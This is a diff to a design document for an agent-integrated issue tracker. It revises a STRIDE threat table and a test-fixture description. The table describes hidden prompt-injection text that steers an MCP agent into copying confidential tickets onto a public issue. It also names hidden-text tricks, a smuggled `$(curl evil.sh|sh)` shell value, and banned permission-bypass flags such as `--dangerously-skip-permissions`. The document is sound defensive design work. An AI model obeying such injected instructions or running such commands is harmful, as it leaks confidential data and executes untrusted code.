@@ -313,11 +313,11 @@ Every object serializer (`Project`, `Issue`, `Sticky`, `Doc`, `Page`, `View`) re
 
 ---
 
-### 3.5 STRIDE Threat Matrix & MCP Read-Taint Exfiltration Defense
+### 3.5 STRIDE Threat Matrix & Explicit Key-Scoping Defense
 
 | Threat Vector | Concrete Attack Scenario | Architectural Control |
 | :--- | :--- | :--- |
-| **Indirect Prompt Injection & Cross-Project Exfiltration** | Public bug description hides instructions telling an MCP agent or `agy -p` gate to read confidential `SEC-*` tickets and post them back onto the public issue. | **1. Hidden-Text Ingestion Pruner:** Strips hidden HTML/CSS (`display:none`, `opacity:0`, `font-size:0`), HTML comments, and zero-width Unicode (`U+200B..U+200F`, `U+E0000..U+E007F`).<br>**2. Session Read-Taint High-Water Mark:** Once an MCP session reads from a restricted project $P_A$, subsequent writes (`add_comment`, `transition_ticket`) to a broader-audience project $P_B$ ($\text{Audience}(P_B) \not\subseteq \text{Audience}(P_A)$) are blocked with `CROSS_SCOPE_TAINT_CONFIRMATION_REQUIRED`. |
+| **Indirect Prompt Injection & Cross-Project Exfiltration** | Public bug description hides instructions telling an MCP agent or `agy -p` gate to read confidential `SEC-*` tickets and post them back onto the public issue. | **1. Hidden-Text Ingestion Pruner:** Strips hidden HTML/CSS (`display:none`, `opacity:0`, `font-size:0`), HTML comments, and zero-width Unicode (`U+200B..U+200F`, `U+E0000..U+E007F`).<br>**2. Explicit CredentialBoundary Key Scoping:** Scoped API keys enforce strict project, workspace, and capability boundaries at both the MCP gateway and PostgreSQL `FORCE ROW LEVEL SECURITY` (`app_credential_projects()`, `app_credential_workspaces()`, `app_credential_capability_mask()`). An agent key pinned to project $P_A$ cannot read, list, search, resolve, or mutate sibling project $P_B$ at the database row level. |
 | **Hostile Media (`SVG`, `Mermaid`, Paste-Jacking, SSRF)** | Attacker uploads `.svg` with `<script>`/`<foreignObject>`/`<use>` billion-laughs, injects `%%{init}%%` Mermaid directives, or embeds `163.254.169.254` tracking pixels. | Canonical Markdown-only DB; hidden-DOM paste pruner; `beautiful-mermaid` Worker -> `blob:` `<img>` (`%%{init}%%` stripped); `roxmltree`+`DOMPurify` SVG -> `<img>` + `CSP: sandbox` + `Content-Disposition: attachment`; cookieless DNS-pinned `/api/v1/media-proxy`. |
 | **CLI Pipe Injection (`${context} \| agy -p`)** | Ticket summary contains `$(curl evil.sh\|sh)` or `--dangerously-skip-permissions` hoping shell expansion executes it. | **Zero-Shell `execve` + `FD 0 stdin` Pipe:** Never invokes `/bin/sh -c`. `${context}` is streamed strictly over `FD 0 (stdin)` into an explicit `argv` array inside a network-restricted, `:ro`-mounted `nsjail` sandbox with banned `--yolo`/`--dangerously-*` flag validation. |
 | **Standalone `docker run` Misconfiguration** | Operator exposes standalone `:8080` container with default credentials or TCP Postgres port. | Zero baked-in keys (`keyring.json` `0600` generated at first boot); single-use `kb_setup_*` URL in `docker logs` (never `admin/admin`); PG `listen_addresses = ''` Unix socket only; `postgres` vs `kanban` UID separation. |
@@ -1150,7 +1150,7 @@ final_verdict:
 ```
 
 - **Multi-Turn Tool & Stream Replay:** Replays exact token-by-token SSE chunks (for `<150ms` `✨` Sparkle tests), multi-step MCP/repo tool calls, and simulated `agy -p` / `codex exec -s read-only -` `stdout`/`stderr`/exit-code streams.
-- **Chaos & Fault Injection Modes:** Built-in fault fixtures test `HTTP 429` rate-limit backoff, TTFT SLA timeout (`>150ms` Sparkle abort), circuit-breaker trip (`CLOSED -> OPEN`), malformed non-JSON CLI `stdout`, and prompt-injection canary strings (asserting the outbound secret scrubber and read-taint guard block exfiltration).
+- **Chaos & Fault Injection Modes:** Built-in fault fixtures test `HTTP 429` rate-limit backoff, TTFT SLA timeout (`>150ms` Sparkle abort), circuit-breaker trip (`CLOSED -> OPEN`), malformed non-JSON CLI `stdout`, and prompt-injection canary strings (asserting the outbound secret scrubber and CredentialBoundary key-scoping block exfiltration).
 
 ---
 
